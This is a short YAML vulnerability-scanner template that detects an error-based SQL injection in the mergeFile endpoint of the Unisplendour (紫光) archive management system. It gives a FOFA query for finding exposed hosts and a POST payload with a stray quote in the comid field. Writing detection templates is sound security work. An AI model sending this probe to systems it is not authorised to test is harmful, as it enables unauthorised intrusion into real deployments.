id: poc-yaml-th-ams-mergefile-sqli
info:
  name: 紫光档案管理系统 mergeFile SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  - 两高一弱
  finger: 紫光档案管理系统
  fofa: app="紫光-档案管理系统" && body="www.unissoft.com"
requests:
- method: GET
  path: /
  expression: status_code == 200 && contains(body,"紫光档案管理系统")
- method: POST
  path: /Archive/ErecordManage/mergeFile
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: userID=admin&fondsid=1&comid=1'
  expression: status_code == 404 && contains(body,"SQL信息") && contains(body,"errorSql")
    && contains(body,"Rest db")
variables: {}
transport: http
